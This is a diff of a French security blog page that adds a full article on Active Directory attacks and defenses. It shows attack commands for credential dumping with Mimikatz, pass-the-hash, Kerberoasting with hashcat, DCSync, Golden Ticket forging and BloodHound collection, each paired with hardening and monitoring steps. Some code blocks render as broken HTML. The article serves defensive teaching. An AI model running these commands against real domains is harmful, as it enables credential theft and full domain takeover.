@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Active Directory : attaques et défense — Temgus.CyberBlog</title>
 <meta name="description" content="Pass-the-Hash, Kerberoasting, DCSync — les attaques AD et comment s'en défendre.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/active-directory.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/active-directory.html">
 <meta property="og:title" content="Active Directory : attaques et défense — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Active Directory : attaques et défense — Temgus.CyberBlog">
 <meta name="twitter:description" content="Pass-the-Hash, Kerberoasting, DCSync — les attaques AD et comment s'en défendre.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,473 @@
   "headline": "Active Directory : attaques et défense",
   "description": "Pass-the-Hash, Kerberoasting, DCSync — les attaques AD et comment s'en défendre.",
   "datePublished": "2025-04-19",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/active-directory.html",
   "inLanguage": "fr",
   "keywords": "Active Directory, Windows, Kerberos",
-  "timeRequired": "PT13M"
+  "timeRequired": "PT13M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🏢</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Active Directory : attaques et défense</h1>
-  <p style="color:#8892a4;max-width:500px">Pass-the-Hash, Kerberoasting, DCSync — les attaques AD et comment s'en défendre.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#active-directory" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🏢</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Active Directory : attaques et défense</div>
+      <div class="meta-details">
+        <span>📅 2025-04-19</span>
+        <span>⏱ 13 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#qu-est-ce-qu-active-directory-">Qu'est-ce qu'Active Directory ?</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#composants-cl-s">Composants clés</a></li>
+<li><a href="#les-attaques-active-directory-courantes">Les attaques Active Directory courantes</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#1-pass-the-hash-pth-">1. Pass-the-Hash (PtH)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#2-kerberoasting">2. Kerberoasting</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#3-dcsync">3. DCSync</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#4-pass-the-ticket-golden-ticket">4. Pass-the-Ticket / Golden Ticket</a></li>
+<li><a href="#bloodhound-cartographier-les-chemins-d-attaque">BloodHound : cartographier les chemins d'attaque</a></li>
+<li><a href="#durcissement-active-directory">Durcissement Active Directory</a></li>
+<li><a href="#events-windows-surveiller">Events Windows à surveiller</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Active Directory : attaques et défense</h1>
+
+<p>Active Directory (AD) est le système d'authentification central de <strong>90% des entreprises Fortune 500</strong>. C'est aussi la cible principale des attaquants lors d'intrusions. Comprendre les attaques AD est essentiel pour défendre votre infrastructure Windows.</p>
+
+<h2 id="qu-est-ce-qu-active-directory-">Qu'est-ce qu'Active Directory ?</h2>
+
+<p>Active Directory est le service d'annuaire de Microsoft qui gère :</p>
+<ul><li><strong>L'authentification</strong> : qui peut se connecter</li><li><strong>L'autorisation</strong> : ce que chaque utilisateur peut faire</li><li><strong>Les politiques</strong> : configuration des postes (GPO)</li><li><strong>Les ressources</strong> : partages réseau, imprimantes, applications</li></ul>
+
+<pre><code>Domaine : entreprise.local
+<p>│</p>
+<p>[Domain Controller]</p>
+<p>│</p>
+<p>┌────┴────┐</p>
+<p>│         │</p>
+<p>[Users]   [Computers]</p>
+<p>│         │</p>
+<p>Jean      PC-Jean</p>
+<p>Marie     PC-Marie</p>
+<p>Admin     Serveur-01</code></pre>
+
+<h3 id="composants-cl-s">Composants clés</h3>
+
+<p>| Composant | Rôle |</p>
+<p>|-----------|------|</p>
+<p>| Domain Controller (DC) | Serveur central AD |</p>
+<p>| LDAP | Protocole d'accès à l'annuaire |</p>
+<p>| Kerberos | Protocole d'authentification |</p>
+<p>| NTLM | Protocole d'authentification legacy |</p>
+<p>| GPO | Group Policy Objects - politiques de configuration |</p>
+<p>| OU | Organizational Units - conteneurs d'organisation |</p>
+
+<h2 id="les-attaques-active-directory-courantes">Les attaques Active Directory courantes</h2>
+
+<h3 id="1-pass-the-hash-pth-">1. Pass-the-Hash (PtH)</h3>
+
+<p>Windows stocke les hashes NTLM des mots de passe en mémoire. Un attaquant peut utiliser ce hash directement sans connaître le mot de passe en clair.</p>
+
+<pre><code class="language-bash"># Extraction des hashes avec Mimikatz (sur système compromis)
+<p>mimikatz # privilege::debug</p>
+<p>mimikatz # sekurlsa::logonpasswords</p>
+<h1>Résultat :</h1>
+<h1>Username : Administrateur</h1>
+<h1>NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0  ← Hash utilisable !</h1>
+
+<h1>Pass-the-Hash avec impacket</h1>
+<p>python3 psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \</p>
+<p>Administrateur@192.168.1.10</p>
+<h1>Connexion réussie sans connaître le mot de passe !</code></pre></h1>
+
+<p><strong>Défense :</strong></p>
+<pre><code class="language-powershell"># Activer la protection LSA (empêche l'extraction des hashes)
+<p>Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" <code></p>
+<p>-Name "RunAsPPL" -Value 1</p>
+
+<h1>Windows Credential Guard (Windows 10/11 Enterprise)</h1>
+<h1>Isole les credentials dans une VM sécurisée</h1>
+
+<h1>Désactiver NTLM, forcer Kerberos</h1>
+<p>Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" </code></p>
+<p>-Name "LmCompatibilityLevel" -Value 5</code></pre>
+
+<h3 id="2-kerberoasting">2. Kerberoasting</h3>
+
+<p>Kerberos permet de demander des tickets de service pour n'importe quel compte. Les tickets sont chiffrés avec le hash du compte de service — crackable hors ligne.</p>
+
+<pre><code class="language-bash"># Identifier les comptes avec SPN (cibles Kerberoasting)
+<h1>Depuis une machine du domaine</h1>
+<p>setspn -Q <em>/</em> | grep -v "CN=krbtgt"</p>
+
+<h1>Impacket - Récupérer les tickets kerberos</h1>
+<p>python3 GetUserSPNs.py entreprise.local/user:password -dc-ip 192.168.1.1 -request</p>
+
+<h1>Résultat : hash Kerberos 5 crackable avec hashcat</h1>
+<p>hashcat -m 13100 hashes.txt wordlist.txt --rules rockyou-30000.rule</code></pre>
+
+<p><strong>Défense :</strong></p>
+<pre><code class="language-powershell"># Utiliser des mots de passe longs pour les comptes de service (30+ chars)
+<h1>Ou utiliser des gMSA (Group Managed Service Accounts)</h1>
+<p>New-ADServiceAccount -Name "MonService" -DNSHostName "serveur.entreprise.local" `</p>
+<p>-PrincipalsAllowedToRetrieveManagedPassword "Serveurs_Autorisés"</p>
+
+<h1>Auditer les SPN existants</h1>
+<p>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></pre>
+
+<h3 id="3-dcsync">3. DCSync</h3>
+
+<p>Permet à un attaquant avec les bons droits de simuler un Domain Controller et de demander la réplication de tous les hashes de mots de passe.</p>
+
+<pre><code class="language-bash"># DCSync avec Mimikatz (nécessite droits Replication)
+<p>mimikatz # lsadump::dcsync /domain:entreprise.local /user:krbtgt</p>
+<h1>Récupère le hash NTLM du compte krbtgt → permet de créer des Golden Tickets</h1>
+
+<h1>Avec impacket</h1>
+<p>python3 secretsdump.py entreprise.local/AdminDA:password@192.168.1.1</p>
+<h1>Dump de tous les hashes du domaine !</code></pre></h1>
+
+<p><strong>Défense :</strong></p>
+<pre><code class="language-powershell"># Auditer qui a les droits DCSync
+<h1>Ces droits ne devraient appartenir qu'aux DCs !</h1>
+<p>Get-ADObject -Filter * -Properties nTSecurityDescriptor | ...</p>
+
+<h1>Surveiller l'event ID 4662 dans les logs Windows</h1>
+<h1>(Accès à un objet AD avec droit Replication)</code></pre></h1>
+
+<h3 id="4-pass-the-ticket-golden-ticket">4. Pass-the-Ticket / Golden Ticket</h3>
+
+<pre><code class="language-bash"># Golden Ticket : créer un ticket Kerberos forgé valable 10 ans
+<h1>Nécessite le hash du compte krbtgt (obtenu via DCSync)</h1>
+
+<p>mimikatz # kerberos::golden /domain:entreprise.local \</p>
+<p>/sid:S-1-5-21-xxxxx \</p>
+<p>/krbtgt:HASH_KRBTGT \</p>
+<p>/user:Administrateur \</p>
+<p>/ticket:golden.kirbi</p>
+
+<h1>Utiliser le golden ticket</h1>
+<p>mimikatz # kerberos::ptt golden.kirbi</p>
+<h1>Accès à toutes les ressources du domaine !</code></pre></h1>
+
+<p><strong>Défense :</strong></p>
+<pre><code class="language-powershell"># Réinitialiser le mot de passe krbtgt DEUX FOIS (intervalle 10h)
+<h1>après toute compromission suspectée</h1>
+<p>Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (Read-Host -AsSecureString)</p>
+
+<h1>Activer Protected Users Security Group pour les comptes sensibles</h1>
+<p>Add-ADGroupMember -Identity "Protected Users" -Members "Administrateur"</code></pre>
+
+<h2 id="bloodhound-cartographier-les-chemins-d-attaque">BloodHound : cartographier les chemins d'attaque</h2>
+
+<p>BloodHound est l'outil de référence pour visualiser les chemins d'attaque dans AD.</p>
+
+<pre><code class="language-bash"># Collecte des données avec SharpHound
+<p>.\SharpHound.exe -c All</p>
+
+<h1>Ou avec impacket (sans agent sur le domaine)</h1>
+<p>python3 bloodhound-python -u user -p password \</p>
+<p>-d entreprise.local -dc dc01.entreprise.local -c All</p>
+
+<h1>Lancer BloodHound</h1>
+<p>neo4j start</p>
+<p>bloodhound</p>
+
+<h1>Requêtes utiles dans BloodHound</h1>
+<p>"Find all Domain Admins"</p>
+<p>"Shortest Paths to Domain Admins"</p>
+<p>"Find Principals with DCSync Rights"</p>
+<p>"Users with most Local Admin Rights"</code></pre>
+
+<h2 id="durcissement-active-directory">Durcissement Active Directory</h2>
+
+<pre><code class="language-powershell"># 1. Tier Model - Séparer les niveaux d'administration
+<h1>Tier 0 : Domain Admins (seulement sur DCs)</h1>
+<h1>Tier 1 : Admins serveurs (seulement sur serveurs)</h1>
+<h1>Tier 2 : Admins postes (seulement sur postes)</h1>
+<h1>Interdire la connexion Tier 0 sur Tier 1/2 !</h1>
+
+<h1>2. LAPS - Mot de passe admin local unique par machine</h1>
+<p>Install-Module LAPS</p>
+<h1>Chaque PC a un mot de passe administrateur local unique</h1>
+<h1>Stocké dans AD, accessible seulement par les admins autorisés</h1>
+
+<h1>3. Privileged Access Workstations (PAW)</h1>
+<h1>Postes dédiés uniquement à l'administration</h1>
+<h1>Pas d'accès internet, pas d'email, pas de navigation web</h1>
+
+<h1>4. Audit des groupes privilégiés</h1>
+<p>Get-ADGroupMember -Identity "Domain Admins"</p>
+<p>Get-ADGroupMember -Identity "Enterprise Admins"</p>
+<h1>Ces groupes doivent être aussi vides que possible !</h1>
+
+<h1>5. Activer l'audit avancé</h1>
+<p>auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable</p>
+<p>auditpol /set /subcategory:"Logon" /success:enable /failure:enable</p>
+<p>auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable</code></pre>
+
+<h2 id="events-windows-surveiller">Events Windows à surveiller</h2>
+
+<p>| Event ID | Signification |</p>
+<p>|----------|---------------|</p>
+<p>| 4624 | Connexion réussie |</p>
+<p>| 4625 | Échec de connexion |</p>
+<p>| 4648 | Connexion avec credentials explicites |</p>
+<p>| 4662 | Accès à un objet AD (DCSync !) |</p>
+<p>| 4720 | Création d'un compte utilisateur |</p>
+<p>| 4728 | Ajout à un groupe privilégié |</p>
+<p>| 7045 | Installation d'un nouveau service |</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Active Directory est à la fois le point d'entrée le plus attaqué et le plus critique des environnements Windows. Une compromission du DC signifie une compromission totale du domaine. Les clés de la défense : <strong>moindre privilège, surveillance des groupes privilégiés, journalisation exhaustive</strong> et réponse rapide aux incidents.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#active-directory" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-docker.html" class="nav-prev">← Sécurité des conteneurs Docker</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-mobile.html" class="nav-next">Sécurité mobile : Android et iOS →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
